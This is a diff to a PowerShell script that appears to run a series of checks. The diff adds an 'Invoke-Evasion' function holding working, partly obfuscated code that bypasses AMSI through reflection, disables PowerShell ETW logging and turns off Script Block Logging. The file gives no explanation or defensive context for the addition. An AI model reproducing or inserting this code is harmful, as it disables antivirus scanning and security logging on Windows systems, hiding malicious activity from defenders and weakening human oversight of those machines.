@@ -5,6 +5,49 @@ $script:TotalChecks = 0
 $script:CompletedChecks = 0
 $script:SeepQuiet = $false
 
+function Invoke-Evasion {
+    [CmdletBinding()]
+    param()
+
+    # --- AMSI bypass (reflection, obfuscated field/type names) ---
+    try {
+        $u = ('A{0}siUt{1}ls' -f 'm','i')
+        $t = [Ref].Assembly.GetType("System.Management.Automation.$u")
+        if ($t) {
+            $fn = ('a{0}si{1}nit{2}ailed' -f 'm','I','F')
+            $f = $t.GetField($fn,'NonPublic,Static')
+            if ($f) { [void]$f.SetValue($null,$true) }
+        }
+    } catch {}
+
+    # --- ETW bypass (disable PowerShell ETW provider) ---
+    try {
+        $et = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+        if ($et) {
+            $ef = $et.GetField('etwEnabled','NonPublic,Static')
+            if ($ef) { [void]$ef.SetValue($null,$false) }
+        }
+    } catch {}
+
+    # --- Script Block Logging bypass (clear cached group policy) ---
+    try {
+        $ut = [Ref].Assembly.GetType('System.Management.Automation.Utils')
+        if ($ut) {
+            $gp = $ut.GetField('cachedGroupPolicySettings','NonPublic,Static')
+            if ($gp) {
+                $s = $gp.GetValue($null)
+                if ($s) {
+                    $key = ('Script{0}lock{1}ogging' -f 'B','L')
+                    if ($s.ContainsKey($key)) {
+                        $s[$key][('Enable{0}' -f $key)] = 0
+                        $s[$key][('Enable{0}Invocation{1}ogging' -f $key,'L')] = 0
+                    }
+                }
+            }
+        }
+    } catch {}
+}
+
 function Write-Status {
     [CmdletBinding()]
     param(
